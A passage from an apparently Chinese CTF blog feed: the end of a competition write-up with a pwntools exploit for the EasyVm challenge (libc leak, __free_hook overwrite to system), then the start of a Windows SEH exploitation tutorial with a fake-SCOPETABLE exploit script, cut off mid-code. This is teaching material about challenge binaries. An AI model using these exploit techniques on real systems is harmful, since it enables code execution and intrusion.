id="easyvm">EasyVm</span></h2><p>这一题可以操作的方式太多了，唯一难点就是泄露，修改多种方式都可以。有利用putchar任意泄露的，用getchar任意修改，还可以free之后main_arena的地址直接给了reg[1],直接可以打印出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'EasyVM'</span></span><br><span class="line"><span class="comment">#ctx.remote_libc = './libc.so'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'121.36.215.224'</span>,<span class="number">9999</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0xF72</span>&#125;</span><br><span class="line">ctx.breakpoints = [<span class="number">0xF72</span>]</span><br><span class="line">ctx.debug()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(content)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt;&gt; \n"</span>,<span class="number">1</span>)</span><br><span class="line">s(content+<span class="string">'\x99\x99\x99'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt;&gt; \n"</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span><span class="params">()</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt;&gt; \n"</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt;&gt; \n"</span>,<span class="number">3</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(content)</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'\x71'</span>+content</span><br><span class="line">choice()</span><br><span class="line">create(<span class="string">'\x80\x10/bin\x80\x10/sh\x00'</span>+push(p32(<span class="number">0x66666666</span>))*<span class="number">77</span>)</span><br><span class="line">run()</span><br><span class="line">free()</span><br><span class="line">create(<span class="string">'\x11'</span>)</span><br><span class="line">run()</span><br><span class="line">ru(<span class="string">'0x'</span>)</span><br><span class="line">libc_base=int(r(<span class="number">8</span>),<span class="number">16</span>)-(<span class="number">0xf7efe930</span><span class="number">-0xf7d4c000</span>)</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">create(push(p32(free_hook))+<span class="string">'\x76\x00\x00\x00\x00\x54\x00'</span>+push(p32(free_hook+<span class="number">1</span>))+<span class="string">'\x76\x00\x00\x00\x00\x54\x00'</span>+push(p32(free_hook+<span class="number">2</span>))+<span class="string">'\x76\x00\x00\x00\x00\x54\x00'</span>+push(p32(free_hook+<span class="number">3</span>))+<span class="string">'\x76\x00\x00\x00\x00\x54\x00'</span>)</span><br><span class="line">run()</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">s(p32(system)[<span class="number">0</span>])</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">s(p32(system)[<span class="number">1</span>])</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">s(p32(system)[<span class="number">2</span>])</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">s(p32(system)[<span class="number">3</span>])</span><br><span class="line">create(push(<span class="string">"/sh\x00"</span>)+push(<span class="string">"/bin"</span>))</span><br><span class="line">run()</span><br><span class="line">free()</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h2><span id="babyhacker2">babyhacker2</span></h2><p>这一题是赛后复现，看来其他队伍的wp,我吐了，就没有一个规规矩矩解的，我说怎么秒的那么快。</p><p>首先是NU1L:  </p><p><img src="./2.png" alt></p><p>修改二进制文件umount,最后exit的时候触发/bin/sh，成功拿到flag。这题局限性是对方用qume起的虚拟机，不然真实机器直接退出了。</p><p>然后V&amp;N:</p><p><img src="./3.png" alt></p><p>这个没弄懂，反正以后比赛可以试一下。</p><h2><span id="kernoob">kernoob</span></h2><p>我真是吃了没有strings的亏，这一题flag还是在附件里面，只不过不是在flag文件里面，在其他地方。</p><p><img src="./1.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;&lt;span id=&quot;summary&quot;&gt;summary&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;这次比赛总的来说发挥还算不错，虽然没有抢到一血，但是至少做出题目了。对kernel题目来说不太熟练，甚至是有点忘了怎么去做了，有时间了一定要多多熟练kernel的利用，不过这次的每道kern
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.top/categories/Writeup/"/>
    
    
      <category term="house of orange" scheme="http://Whali3n51.top/tags/house-of-orange/"/>
    
      <category term="VMpwn" scheme="http://Whali3n51.top/tags/VMpwn/"/>
    
      <category term="SROP" scheme="http://Whali3n51.top/tags/SROP/"/>
    
      <category term="沙盒" scheme="http://Whali3n51.top/tags/%E6%B2%99%E7%9B%92/"/>
    
  </entry>
  
  <entry>
    <title>win_SEH利用初探</title>
    <link href="http://whali3n51.top/2020/02/07/win-SEH%E5%88%A9%E7%94%A8%E5%88%9D%E6%8E%A2/"/>
    <id>http://whali3n51.top/2020/02/07/win-SEH%E5%88%A9%E7%94%A8%E5%88%9D%E6%8E%A2/</id>
    <published>2020-02-07T02:45:11.000Z</published>
    <updated>2020-04-15T01:51:21.499Z</updated>
    
    <content type="html"><![CDATA[<p>武汉加油！湖北加油！</p><p>被疫情隔离在家，很久之前就学会了，但是一直没有时间写，现在终于有时间写一写了。</p><p>这个利用其实和linux下的利用差别还是很大的，要控制好几个结构体，要利用到SEH链。</p><p>先给大家推荐两篇文章吧，我就是照着这两篇文章学习的，这里只是把这两盘文章写的不够详细或者我觉得我难以理解的地方指出来，并且加以总结。</p><p><a href="https://www.anquanke.com/post/id/188170" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188170</a></p><p><a href="http://blog.eonew.cn/archives/1182" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1182</a></p><p>首先要了解一下这几个结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EH4_SCOPETABLE</span> &#123;</span></span><br><span class="line">        DWORD GSCookieOffset;</span><br><span class="line">        DWORD GSCookieXOROffset;</span><br><span class="line">        DWORD EHCookieOffset;</span><br><span class="line">        DWORD EHCookieXOROffset;</span><br><span class="line">        _EH4_SCOPETABLE_RECORD ScopeRecord[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EH4_SCOPETABLE_RECORD</span> &#123;</span></span><br><span class="line">        DWORD EnclosingLevel;</span><br><span class="line">        <span class="keyword">long</span> (*FilterFunc)();</span><br><span class="line">            <span class="keyword">union</span> &#123;</span><br><span class="line">            <span class="keyword">void</span> (*HandlerAddress)();</span><br><span class="line">            <span class="keyword">void</span> (*FinallyFunc)(); </span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这些结构体的是SHE储存的信息，并且这些值是存储在rdata段的，其中_EH4_SCOPETABLE_RECORD存储的是异常处理的函数，当发生异常时，就会调用这个结构体存储的函数。还有注意看嗷,__EH4_SCOPETABLE里面结构体的内容有一项 _EH4_SCOPETABLE_RECORD ScopeRecord[1],也就是这里直接将 _EH4_SCOPETABLE_RECORD的值存进去了</p><p>也就是可以这么理解了，虽然这里不怎么准确，但是我们伪造SCOPETABLE的时候就可以这么伪造了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EH4_SCOPETABLE</span> &#123;</span></span><br><span class="line">        DWORD GSCookieOffset;</span><br><span class="line">        DWORD GSCookieXOROffset;</span><br><span class="line">        DWORD EHCookieOffset;</span><br><span class="line">        DWORD EHCookieXOROffset;</span><br><span class="line">        DWORD EnclosingLevel;</span><br><span class="line">    <span class="keyword">long</span> (*FilterFunc)();</span><br><span class="line">      <span class="keyword">union</span> &#123;</span><br><span class="line">            <span class="keyword">void</span> (*HandlerAddress)();</span><br><span class="line">            <span class="keyword">void</span> (*FinallyFunc)(); </span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里我们主要劫持long (*FilterFunc)();</p><p>关于如何选择存储信息来判断代码的正确性，下面则是选择逻辑。</p><p>说实话，直接看的有点生硬，还是结合题目来理解。</p><p>例子就是这道win_babystack</p><p>题目链接:<a href="babystack.zip">babystack.zip</a></p><p><img src="1.png" alt="image-20200207120145189"></p><p>这一道题最初给了main函数地址和stack地址。</p><p>大大降低了我们难度。</p><p>然后这下面还有任意地址泄露，说明确实是个baby题</p><p><img src="2.png" alt="image-20200207120434082"></p><p>然后漏洞在这里</p><p><img src="3.png" alt="image-20200207120606732"></p><p>这里通过v9输入，我们能控制seh在栈上的布局，从而劫持程序流程。</p><p>具体利用方式在于控制栈上seh的结构体。</p><p>我们首先来分析一下栈上的有哪些seh的值。</p><p><img src="5.png" alt="image-20200207122626305"></p><p>图中，1的值是返回地址，2是ebp，3是security_cookie^scopetable_address的值。在程序中存放security_cookie的位置是固定的，这位置是在data段，但是值不固定。</p><p><img src="6.png" alt="image-20200207122910795"></p><p>我们这里知道了main函数的地址，则我们可以通过泄露将security_cookie给泄露出来。</p><p>然后我们还要泄露Next的值，很多个异常处理块都是通过下图来连接在一块，这个Next的值是在栈上的，ebp-0x1c的地方，我们要修改scopetable_address，是一定会将这个地方覆盖的，但是我们程序会检查Next的值，所以我们要将这个地方泄露出来，然后原封不动的写回去。</p><p><img src="7.png" alt="img"></p><p>说到这里，给的链接上面也讲的挺详细的，我这里就讲讲这些文章我看的比较迷糊的地方</p><p>先研究一下其他博客的exp吧，毕竟我也是学着别人的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'192.168.80.133'</span>, <span class="number">1001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_value</span><span class="params">(addr)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'Do you want to know more?'</span>)</span><br><span class="line">    sh.sendline(<span class="string">'yes'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Where do you want to know'</span>)</span><br><span class="line">    sh.sendline(str(addr))</span><br><span class="line">    sh.recvuntil(<span class="string">'value is '</span>)</span><br><span class="line">    <span class="keyword">return</span> int(sh.recvline(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'stack address ='</span>)</span><br><span class="line">result = sh.recvline()</span><br><span class="line">stack_addr = int(result, <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">'stack_addr: '</span> + hex(stack_addr))</span><br><span class="line">sh.recvuntil(<span class="string">'main address ='</span>)</span><br><span class="line">result = sh.recvline()</span><br><span class="line">main_address = int(result, <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">'main_address: '</span> + hex(main_address))</span><br><span class="line"></span><br><span class="line">security_cookie = get_value(main_address + <span class="number">12116</span>)</span><br><span class="line">log.success(<span class="string">'security_cookie: '</span> + hex(security_cookie))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">sh.sendline(<span class="string">'n'</span>)</span><br><span class="line">next_addr = stack_addr + <span class="number">212</span></span><br><span class="line">log.success(<span class="string">'next_addr: '</span> + hex(next_addr))</span><br><span class="line"><span class="comment">#这上面的都是在泄露，没啥好看的</span></span><br><span class="line">SCOPETABLE = [</span><br><span class="line">    <span class="number">0x0FFFFFFFE</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x0FFFFFFCC</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0xFFFFFFFE</span>,</span><br><span class="line">    main_address + <span class="number">733</span>,</span><br><span class="line">]</span><br><span class="line"><span class="comment">#这上面就是我们要伪造的SCOPETABLE</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">16</span> + flat(SCOPETABLE).ljust(<span class="number">104</span> - <span class="number">16</span>, <span class="string">'a'</span>) + p32((stack_addr + <span class="number">156</span>) ^ security_cookie) + <span class="string">'c'</span> * <span class="number">32</span> + p32(next_addr) + p32(main_address + <span class="number">944</span>) + p32((stack_addr + <span class="number">16</span>) ^ security_cookie) + p32(<span class="number">0</span>) + <span class="string">'b'</span> * <span class="number">16</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvline()</span><br><span class="line">sh.sendline(<span class="string">'yes'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Where do you want to know'</span>)</span><br><span class="line">sh.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>其实这个exp大部分很好懂，当时我卡了很久的地方就是payload的构造部分，相信你们也看到了，不同文章的payload不同。我们先对比两个不一样的payload吧。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里称为payload1</span></span><br><span class="line">SCOPETABLE = [</span><br><span class="line">    <span class="number">0x0FFFFFFFE</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x0FFFFFFCC</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0xFFFFFFFE</span>,</span><br><span class="line">    main_address + <span class="number">733</span>,</span><br><span class="line">]</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">16</span> + flat(SCOPETABLE).ljust(<span class="number">104</span> - <span class="number">16</span>, <span class="string">'a'</span>) + p32((stack_addr + <span class="number">156</span>) ^ security_cookie) + <span class="string">'c'</span> * <span class="number">32</span> + p32(next_addr) + p32(main_address + <span class="number">944</span>) + p32((stack_addr + <span class="number">16</span>) ^ security_cookie) + p32(<span class="number">0</span>) + <span class="string">'b'</span> * <span class="number">16</span></span><br><span class="line">sh.sendline(payload)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里称为payload2</span></span><br><span class="line">SEH_scope_table = p32(<span class="number">0x0FFFFFFE4</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFF20</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFFFE</span>)</span><br><span class="line">SEH_scope_table += p32(shell_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">4</span>+SEH_scope_table.ljust(<span class="number">0x80</span><span class="number">-4</span>,<span class="string">"x22"</span>)+p32(ebp^___security_cookie_value)+<span class="string">"b"</span>*<span class="number">8</span>+p32(Next_value)+p32(main_addr + <span class="number">944</span>)+p32((stack_addr+<span class="number">4</span>)^___security_cookie_value)+p32(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>对比发现两个payload大同小异，区别是ebp^security_cookie的地方不一样。起初我以为没有关系，但是我乱放之后直接导致程序崩溃。</p><p>然后我仔细分析了一下，这个ebp^security_cookie存放的地方和伪造的SCOPETABLE有关系。</p><p>当我们触发异常后，程序会调用se的处理程序，也就是ebp-0x10的地方所指向的地方，这里是不能劫持的，劫持后程序会崩溃，不信可以试试。然后我们到ebp-0x10的这个地方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:00401460                 push    ebp</span><br><span class="line">.text:00401461                 mov     ebp, esp</span><br><span class="line">.text:00401463                 push    [ebp+arg_C]</span><br><span class="line">.text:00401466                 push    [ebp+arg_8]</span><br><span class="line">.text:00401469                 push    [ebp+arg_4]</span><br><span class="line">.text:0040146C                 push    [ebp+arg_0]</span><br><span class="line">.text:0040146F                 push    offset @__security_check_cookie@4 ; __security_check_cookie(x)</span><br><span class="line">.text:00401474                 push    offset ___security_cookie</span><br><span class="line">.text:00401479                 call    _except_handler4_common</span><br><span class="line">.text:0040147E                 add     esp, 18h</span><br><span class="line">.text:00401481                 pop     ebp</span><br><span class="line">.text:00401482                 retn</span><br></pre></td></tr></table></figure><p>这个地方调用了_except_handler4_common</p><p>分析一下_except_handler4_common</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl _except_handler4_common(<span class="keyword">unsigned</span> <span class="keyword">int</span> *securityCookies, <span class="keyword">void</span> (__fastcall *cookieCheckFunction)(<span class="keyword">unsigned</span> <span class="keyword">int</span>), _EXCEPTION_RECORD *exceptionRecord, <span class="keyword">unsigned</span> __int32 sehFrame, _CONTEXT *context)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 异或解密 scope table</span></span><br><span class="line">    scopeTable_1 = (_EH4_SCOPETABLE *)(*securityCookies ^ *(_DWORD *)(sehFrame + <span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sehFrame 等于 上图 ebp - 10h 位置, framePointer 等于上图 ebp 的位置</span></span><br><span class="line">    framePointer = (<span class="keyword">char</span> *)(sehFrame + <span class="number">16</span>);</span><br><span class="line">    scopeTable = scopeTable_1;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 验证 GS</span></span><br><span class="line">    ValidateLocalCookies(cookieCheckFunction, scopeTable_1, (<span class="keyword">char</span> *)(sehFrame + <span class="number">16</span>));</span><br><span class="line">    __except_validate_context_record(context);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( exceptionRecord-&gt;ExceptionFlags &amp; <span class="number">0x66</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        exceptionPointers.ExceptionRecord = exceptionRecord;</span><br><span class="line">        exceptionPointers.ContextRecord = context;</span><br><span class="line">        tryLevel = *(_DWORD *)(sehFrame + <span class="number">12</span>);</span><br><span class="line">        *(_DWORD *)(sehFrame - <span class="number">4</span>) = &amp;exceptionPointers;</span><br><span class="line">        <span class="keyword">if</span> ( tryLevel != <span class="number">-2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                v8 = tryLevel + <span class="number">2</span> * (tryLevel + <span class="number">2</span>);</span><br><span class="line">                filterFunc = (<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD))*(&amp;scopeTable_1-&gt;GSCookieXOROffset + v8);</span><br><span class="line">                scopeTableRecord = (_EH4_SCOPETABLE_RECORD *)((<span class="keyword">char</span> *)scopeTable_1 + <span class="number">4</span> * v8);</span><br><span class="line">                encloseingLevel = scopeTableRecord-&gt;EnclosingLevel;</span><br><span class="line">                scopeTableRecord_1 = scopeTableRecord;</span><br><span class="line">                <span class="keyword">if</span> ( filterFunc )</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 调用 FilterFunc</span></span><br><span class="line">                    filterFuncRet = _EH4_CallFilterFunc(filterFunc);</span><br><span class="line">                    ......</span><br><span class="line">                    <span class="keyword">if</span> ( filterFuncRet &gt; <span class="number">0</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                        ......</span><br><span class="line">                        <span class="comment">// 调用 HandlerFunc</span></span><br><span class="line">                        _EH4_TransferToHandler(scopeTableRecord_1-&gt;HandlerFunc, v5 + <span class="number">16</span>);</span><br><span class="line">                        ......</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                ......</span><br><span class="line">                tryLevel = encloseingLevel;</span><br><span class="line">                <span class="keyword">if</span> ( encloseingLevel == <span class="number">-2</span> )</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                scopeTable_1 = scopeTable;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们重点关注的是那个验证GS的函数，将取出来的scopeTable,当作参数传入了ValidateLocalCookies，然后将ebp传入ValidateLocalCookies。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl ValidateLocalCookies(void (__fastcall *cookieCheckFunction)(unsigned int), _EH4_SCOPETABLE *scopeTable, char *framePointer)</span><br><span class="line">&#123;</span><br><span class="line">    unsigned int v3; // esi@2</span><br><span class="line">    unsigned int v4; // esi@3</span><br><span class="line"></span><br><span class="line">    if ( 